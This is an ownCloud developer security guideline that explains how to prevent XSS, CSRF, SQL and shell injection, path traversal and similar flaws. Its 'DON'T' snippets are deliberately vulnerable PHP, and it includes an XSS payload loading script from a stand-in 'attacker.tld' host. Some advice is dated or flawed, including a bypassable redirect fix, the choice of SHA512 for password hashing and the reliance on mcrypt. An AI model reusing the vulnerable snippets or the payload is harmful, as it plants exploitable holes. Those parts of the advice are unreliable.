Security Guidelines
===================

.. sectionauthor:: Bernhard Posselt <dev@bernhard-posselt.com>, Lukas Reschke <lukas@statuscode.ch>

This guideline highlights some of the most common security problems and how to prevent them. Please review your app if it contains any of the following security holes.

.. note:: **Program defensively**: for instance always check for CSRF or escape strings, even if you do not need it. This prevents future problems where you might miss a change that leads to a security hole.

.. note:: All App Framework security features depend on the call of the controller through :php:meth:`OCA\\AppFramework\\App::main`. If the controller method is executed directly, no security checks are being performed!

General
-------

Source Code Analysis
~~~~~~~~~~~~~~~~~~~~

Before releasing an application and after security-related changes, the complete source code **must** be scanned; we currently with `RIPS`_.
Affected Software:

- Core
- All apps in core
- All apps in the marketplace

Architecture
------------

Security Related Comments in Source Code
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Security-related comments in source code are forbidden. 
Source code means PHP code and especially JavaScript code.
Security-related comments are:

- Usernames and passwords
- Descriptions of processes and algorithms

.. TODO I've chased up Peter about the use of the minifier. I didn’t think it encrypted the information.

Before deploying, use a minifier for JavaScript and CSS files.

Switch Between HTTP and HTTPS
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

ownCloud should only be rendered with HTTPS. 
A switch between HTTP and HTTPS in an application should be avoided, which avoids creating `mixed-content pages`_ and the problems which that can cause. 
Don't use HTTP for the *stylesheet*, *image*, and *JavaScript* files, if the application itself is running under HTTPS.

Security Related Actions
~~~~~~~~~~~~~~~~~~~~~~~~

All security-related actions must take place on the server, which includes *validation*, *authentication*, and *authorization*. 
Additional implementations on the client side are only useful for providing a better user experience. 
Don't hard-code passwords or encryption keys in the source code. 
They have to be in config files and should be user-generated.

Browser plugins
~~~~~~~~~~~~~~~

Don't use browser plugins such as:

- ActiveX Controls
- Java Applets
- Flash

Least Privilege Principle
~~~~~~~~~~~~~~~~~~~~~~~~~

Every application should only have the rights that it needs. 
An application should not access core database tables. 
If it needs data from these tables, it should call an API to retrieve it.

Error Messages and Error Pages
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Don't show sensitive information on error pages or in error messages. 
Sensitive information includes:

- Username/password
- E-Mail addresses
- Version numbers
- Paths

Don't show information in error messages or on error pages, which is too detailed.

**Example:**

If a user can't login, don't show an error like: "*Your password is wrong*". 
Instead, show a message such as: "*There was an error with your credentials*". 
If you print "*Your password is wrong*" then an attacker knows the username was a valid one in the ownCloud installation.
Additionally, consider implementing a `CAPTCHA`_ to prevent brute force attacks, after five failed login attempts.

Session ID Transport
~~~~~~~~~~~~~~~~~~~~

Don't use a session id as a GET Parameter, because these persist in browser history.
Use cookies instead.

New Session ID After a Successful Login
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

After a successful login, the session id should be regenerated to prevent `session fixation attacks`_. 
If you have to switch between HTTPS and HTTP, you should change the session id, because an attacker could have already read the session id.

Access Protection With Authorization Check
------------------------------------------

Every request to the server must perform a check if the user has the authorization to perform this request. 
A client-side check is not recommended. 
However, it can improve the user's experience.

Best Practices
--------------

Use of the eval Function 
~~~~~~~~~~~~~~~~~~~~~~~~~

Don't use either PHP's or JavaScript's ``eval`` functions — especially not with user-supplied data.

Input Validation
~~~~~~~~~~~~~~~~

All user-supplied data, ``$_SERVER``, and ``$_COOKIE`` variables **must** be validated. 
All these contain data which can be changed (or forged) by the client.
You should also sanitize any supplied script code. 

**Example:**

If you expect to receive an integer id as a GET parameter, then always explicitly cast it into an integer using the cast operator ``(int)``, because all ``$_REQUEST`` parameter are strings. 
However, if you expect text as a parameter, use `PHP's htmlspecialchars function`_ with ``ENT_QUOTES`` or ``strip_tags`` to prevent `Cross-site Scripting (XSS) attacks`_.

.. code-block:: php

  <?php

  $neu = htmlspecialchars("<a href='test'>Test</a>", ENT_QUOTES);
  echo $neu; // &lt;a href=&#039;test&#039;&gt;Test&lt;/a&gt;

.. code-block:: php 

  <?php

  $text = '<p>Test-Absatz.</p><!-- Kommentar --> <a href="#fragment">Anderer Text</a>';
  echo strip_tags($text);
  echo "\n";

**Output:**

.. code-block:: console 

  Test-Absatz. Anderer Text
  <p>Test-Absatz.</p> <a href="#fragment">Anderer Text</a>

Please do the validation **before** all other actions.

Path Traversal and Path Manipulation
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you need to access the file system, don't use user-supplied data to build path names. 
You have to check the input parameters for null bytes (``\0``), the links to the current and parent directory on UNIX/Linux filesystems (``.`` and ``..``), and empty strings.

Prevent Command Injection
~~~~~~~~~~~~~~~~~~~~~~~~~

Use `PHP's escapeshellarg() function`_, if your input parameters are arguments for `exec()`_, `popen()`_, `system()`_, or the backtick (`````) operator.

.. code-block:: php 

  <?php

  system('ls '.escapeshellarg($dir));

If you don't know how many arguments your application receives, then use the PHP function `escapeshellcmd()`_ to escape the whole command.

.. code-block:: php

  <?php
  $command = './configure '.$_POST['configure_options'];

  $escaped_command = escapeshellcmd($command);

  system($escaped_command);

Output Escaping
~~~~~~~~~~~~~~~

All input parameters printed out in the response should be escaped. 
Do not use ``print_unescaped()`` in ownCloud templates, use ``p()`` instead. 
If you have to output text in JavaScript use ``$jQuery.text()``. 
If you want to output HTML, use ``$jQuery.html()``. 
A better option is to use a tool like `HTMLPurifier`_.

High Sensitive Information in GET Request
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You should not use sensitive information, like passwords or usernames, in unprotected requests. 
All request with sensitive information should be protected with HTTPS.

Prevent HTTP-Header-Injection (HTTP Response Splitting)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To prevent `HTTP Response Splitting`_, you have to check all request variables for ``%0d`` (CR) and ``%0a`` (LF), if they are parameters provided to `PHP's header() function`_.
This is because an attacker can deface your website, such as redirect the request to a phishing site or executing an XSS attack, by performing header manipulation.

Changes on the Document Object Model (DOM)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If your code changes the DOM, then don't use unvalidated user input.

.. warning:: You should never trust user input.

Prevent SQL-Injection
~~~~~~~~~~~~~~~~~~~~~

If you have to pass parameters to a SQL query, use the escape functions for your database system to prevent `SQL Injection attacks`_. 
In ownCloud you must use the `QueryBuilder`_.

Data Storage
------------

Persistent Storages on Client Side
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Don't save highly sensitive data in persistent storage on the client side. 
Persistent data storage includes:

- `Persistent HTTP cookies`_
- `Flash cookies`_
- `HTML5 Web-Storage`_
- `HTML5 Index DB`_

Release all Resources in Case of an Error
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

All resources, such as database and file locks, must be released when errors occur. 
Doing so prevents the server from being subject to `denial-of-service (DOS) attacks`_.

Cryptography
------------

Symmetric Encryption Methods
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you use symmetric encryption methods in your code, use the following encryption types:

- AES with a key length of 256
- SERPENT with a key length of 256

For block ciphers use the following modes:

- CFB (cipher feedback mode)
- CBC (cipher block chaining mode)

CFB mode requires an initialization vector (IV) to the respective cipher function. 
Whereas in CBC mode, supplying one is optional.
The IV must be unique and must be the same when encrypting and decrypting. 
Use `the PHP crypt library`_ with `libmcrypt`_ greater 2.4.x.

Asymmetric Encryption Methods
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

If you use asymmetric encryption methods, use the following encryption type:

- RSA with key length 4096

Hash Algorithms
~~~~~~~~~~~~~~~

If you need a hash function in PHP, use the SHA512 hash algorithm. 
You can use `PHP's crypt() function`_, but only with a strong salt.
Don't use *MD5*, *SHA1* or *SHA256*. 
These types of algorithms are designed to be very fast and efficient. 
However, with modern techniques and computer equipment, it has become trivial to brute force the output of these algorithms to discover the original input.

Cookies
-------

Secure Flag
~~~~~~~~~~~

If you use HTTPS to protect requests, then you have to use `the secure flag`_ for your cookies.

HTTP Only
~~~~~~~~~

If you don't have to access your cookie content in JavaScript, the set `the HttpOnly flag`_ on every cookie.

Path
~~~~

If possible, set a path for a cookie. 
Doing so ensures that the cookie is only valid for requests using the provided path.

Passwords
---------

The following chapter is not only for developers but also for admins and end-users.

Charset of Passwords 
~~~~~~~~~~~~~~~~~~~~~

The charset of a password should contain *characters*, *numbers*, and *special characters*.
Characters should be both upper and lowercase.

Password Length
~~~~~~~~~~~~~~~

All password should have a minimum length of eight characters and contain numbers and special characters. 
These requirements must be validated by the application.

Password Quality
~~~~~~~~~~~~~~~~

If the user can choose his password for the first time, the quality of a password should be displayed graphically.

Password Input
~~~~~~~~~~~~~~

If a user can input his password into an input field, the input field **must** be of type "password". 
If an error occurs, don't fill the password field automatically when displaying an error message.

Save Passwords
~~~~~~~~~~~~~~

Don't save passwords in clear text. 
Use a `salted hash`_

Default and Initial Passwords
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Both default and initial passwords should be avoided. 
If you have to use either, you have to make sure that the password is changed by the user on the first call to the application.

User Interface
--------------

Input Auto-completion
~~~~~~~~~~~~~~~~~~~~~

Auto-complete must be disabled for all input fields which receive sensitive data.
Sensitive data includes:

- Username
- Password
- Credit card information
- Banking information

For text input fields use ``autocomplete="off"`` or use a dynamically generated field name.

For password fields use: 

.. code-block:: 

  <input name="pass" type="password" autocomplete="new-password" />

Attack Vectors
--------------

Auth bypass / Privilege escalations
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Auth bypass/privilege escalations happen when users can perform unauthorized actions.
ownCloud offers three simple checks:

* **OCP\\JSON::checkLoggedIn()**: Checks if the logged in user is logged in
* **OCP\\JSON::checkAdminUser()**: Checks if the logged in user has admin privileges
* **OCP\\JSON::checkSubAdminUser()**: Checks if the logged in user has group admin privileges

Using the App Framework, these checks are already automatically performed for each request and have to be explicitly turned off by using annotations above your controller method,  see :doc:`../app/controllers`.

Additionally always check if the user has the right to perform that action.

Clickjacking
------------

`Clickjacking <http://en.wikipedia.org/wiki/Clickjacking>`_ tricks the user to click into an invisible iframe to perform an arbitrary action (e.g. delete an user account)

To prevent such attacks ownCloud sends the `X-Frame-Options` header to all template responses. Don't remove this header if you don't really need it!

This is already built into ownCloud if `ownCloud templates <https://doc.owncloud.org/server/latest/developer_manual/app/templates.html>`_ or `Twig Templates`_ are used.

Code executions / File inclusions
---------------------------------
Code Execution means that an attacker is able to include an arbitrary PHP file. This PHP file runs with all the privileges granted to the normal application and can do an enormous amount of damage.

Code executions and file inclusions can be easily prevented by **never** allowing user-input to run through the following functions:

* **include()**
* **require()**
* **require_once()**
* **eval()**
* **fopen()**

.. note:: Also **never** allow the user to upload files into a folder which is reachable from the URL!

**DON'T**

.. code-block:: php

  <?php
  require("/includes/" . $_GET['file']);

.. note:: If you have to pass user input to a potentially dangerous function, double check to be sure that there is no other way. If it is not possible otherwise sanitize every user parameter and ask people to audit your sanitize function.

Cross site request forgery
--------------------------
Using `CSRF <http://en.wikipedia.org/wiki/Cross-site_request_forgery>`_ one can trick a user into executing a request that he did not want to make. Thus every POST and GET request needs to be protected against it. The only places where no CSRF checks are needed are in the main template, which is rendering the application, or in externally callable interfaces.

.. note:: Submitting a form is also a POST/GET request!

To prevent CSRF in an app, be sure to call the following method at the top of all your files:

.. code-block:: php

  <?php
  OCP\JSON::callCheck();

If you are using the App Framework, every controller method is automatically checked for CSRF unless you explicitly exclude it by setting the @NoCSRFRequired annotation before the controller method, see :doc:`../app/controllers`

Cross site scripting
--------------------

`Cross site scripting <http://en.wikipedia.org/wiki/Cross-site_scripting>`_ happens when user input is passed directly to templates. A potential attacker might be able to inject HTML/JavaScript into the page to steal the users session, log keyboard entries, even perform DDOS attacks on other websites or other malicious actions.

Despite the fact that ownCloud uses Content-Security-Policy to prevent the execution of inline JavaScript code developers are still required to prevent XSS. CSP is just another layer of defense that is not implemented in all web browsers.

To prevent XSS in your app you have to sanitize the templates and all JavaScripts which performs a DOM manipulation.

Templates
~~~~~~~~~

Let's assume you use the following example in your application:

.. code-block:: php

  <?php
  echo $_GET['username'];

An attacker might now easily send the user a link to::

    app.php?username=<script src="attacker.tld"></script>

to overtake the user account. The same problem occurs when outputting content from the database or any other location that is writable by users.

Another attack vector that is often overlooked is XSS in **href** attributes. HTML allows to execute javascript in href attributes like this::

    <a href="javascript:alert('xss')">


To prevent XSS in your app, **never use echo, print() or <\%=** - use **p()** instead which will sanitize the input. Also **validate URLs to start with the expected protocol** (starts with http for instance)!

.. note:: Should you ever require to print something unescaped, double check if it is really needed. If there is no other way (e.g. when including of subtemplates) use `print_unescaped`  with care.

JavaScript
~~~~~~~~~~

Avoid manipulating the HTML directly via JavaScript, this often leads to XSS since people often forget to sanitize variables:

.. code-block:: js

  var html = '<li>' + username + '</li>"';

If you **really** want to use JavaScript for something like this use `escapeHTML` to sanitize the variables:

.. code-block:: js

  var html = '<li>' + escapeHTML(username) + '</li>';

An even better way to make your app safer is to use the jQuery built-in function **$.text()** instead of **$.html()**.

**DON'T**

.. code-block:: js

  messageTd.html(username);

**DO**

.. code-block:: js

  messageTd.text(username);

It may also be wise to choose a proper JavaScript framework like AngularJS which automatically  handles the JavaScript escaping for you.

Directory Traversal
-------------------
Very often developers forget about sanitizing the file path (removing all \\ and /), this allows an attacker to traverse through directories on the server which opens several potential attack vendors including privilege escalations, code executions or file disclosures.

**DON'T**

.. code-block:: php

  <?php
  $username = OC_User::getUser();
  fopen("/data/" . $username . "/" . $_GET['file'] . ".txt");

**DO**

.. code-block:: php

  <?php
  $username = OC_User::getUser();
  $file = str_replace(array('/', '\\'), '',  $_GET['file']);
  fopen("/data/" . $username . "/" . $file . ".txt");

.. note:: PHP also interprets the backslash (\\) in paths, don't forget to replace it too!


Shell Injection
---------------

`Shell Injection <http://en.wikipedia.org/wiki/Code_injection#Shell_injection>`_ occurs if PHP code executes shell commands (e.g. running a latex compiler). Before doing this, check if there is a PHP library that already provides the needed functionality. If you really need to execute a command be aware that you have to escape every user parameter passed to one of these functions:

* **exec()**
* **shell_exec()**
* **passthru()**
* **proc_open()**
* **system()**
* **popen()**

.. note:: Please require/request additional programmers to audit your escape function.

Without escaping the user input this will allow an attacker to execute arbitrary shell commands on your server.

PHP offers the following functions to escape user input:

* **escapeshellarg()**: Escape a string to be used as a shell argument
* **escapeshellcmd()**: Escape shell metacharacters

**DON'T**

.. code-block:: php

  <?php
  system('ls '.$_GET['dir']);

**DO**

.. code-block:: php

  <?php
  system('ls '.escapeshellarg($_GET['dir']));

Sensitive data exposure
-----------------------

Always store user data or configuration files in safe locations, e.g. **owncloud/data/** and not in the webroot where they can be accessed by anyone using a web browser.

SQL Injection
-------------
`SQL Injection <http://en.wikipedia.org/wiki/SQL_injection>`_ occurs when SQL query strings are concatenated with variables.

To prevent this, always use prepared queries:

.. code-block:: php

  <?php
  $sql = 'SELECT * FROM `users` WHERE `id` = ?';
  $query = \OCP\DB::prepare($sql);
  $params = array(1);
  $result = $query->execute($params);

If the App Framework is used, write SQL queries like this in the a class that extends the Mapper:

.. code-block:: php

  <?php
  // inside a child mapper class
  $sql = 'SELECT * FROM `users` WHERE `id` = ?';
  $params = array(1);
  $result = $this->execute($sql, $params);

Unvalidated redirects
---------------------
This is more of an annoyance than a critical security vulnerability since it may be used for social engineering or phishing.

Before redirecting, always validate the URL if the requested URL is on the same domain or is an allowed resource.

**DON'T**

.. code-block:: php

  <?php
  header('Location:'. $_GET['redirectURL']);

**DO**

.. code-block:: php

  <?php
  header('Location: https://example.com'. $_GET['redirectURL']);

Getting Help
------------

If you need help to ensure that a function is secure, please ask on our `mailing list <https://mailman.owncloud.org/mailman/listinfo/devel>`_ or in IRC channel **#owncloud-dev** on **irc.freenode.net**.

.. Links
   
.. _Twig Templates: https://twig.symfony.com/
.. _RIPS: http://rips-scanner.sourceforge.net/
.. _CAPTCHA: https://en.wikipedia.org/wiki/CAPTCHA
.. _the HttpOnly flag: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
.. _the eval function: http://php.net/manual/en/function.eval.php 
.. _PHP's htmlspecialchars function: http://php.net/manual/en/function.htmlspecialchars.php
.. _PHP's escapeshellarg() function: http://php.net/manual/en/function.escapeshellarg.php
.. _exec(): http://php.net/manual/en/function.exec.php
.. _popen(): http://php.net/manual/en/function.popen.php
.. _system(): http://php.net/manual/en/function.system.php
.. _escapeshellcmd(): http://php.net/manual/en/function.escapeshellcmd.php
.. _HTMLPurifier: http://htmlpurifier.org
.. _PHP's header() function: http://php.net/manual/en/function.header.php
.. _Persistent HTTP cookies: http://www.allaboutcookies.org/cookies/cookies-the-same.html
.. _Flash cookies: http://www.popularmechanics.com/technology/security/how-to/a6134/what-are-flash-cookies-and-how-can-you-stop-them/
.. _HTML5 Web-Storage: https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API
.. _HTML5 Index DB: https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API
.. _libmcrypt: http://mcrypt.sourceforge.net
.. _the PHP crypt library: http://php.net/manual/en/function.crypt.php
.. _PHP's crypt() function: http://php.net/manual/en/function.crypt.php
.. _denial-of-service (DOS) attacks: https://en.wikipedia.org/wiki/Denial-of-service_attack
.. _salted hash: https://crackstation.net/hashing-security.htm
.. _QueryBuilder: https://github.com/owncloud/core/blob/master/lib/private/DB/QueryBuilder/QueryBuilder.php
.. _the secure flag: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie
.. _mixed-content pages: https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content 
.. _session fixation attacks: https://www.owasp.org/index.php/Session_fixation 
.. _Cross-site Scripting (XSS) attacks: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS) 
.. _HTTP Response Splitting: https://www.owasp.org/index.php/HTTP_Response_Splitting
.. _SQL Injection attacks: https://www.owasp.org/index.php/SQL_Injection
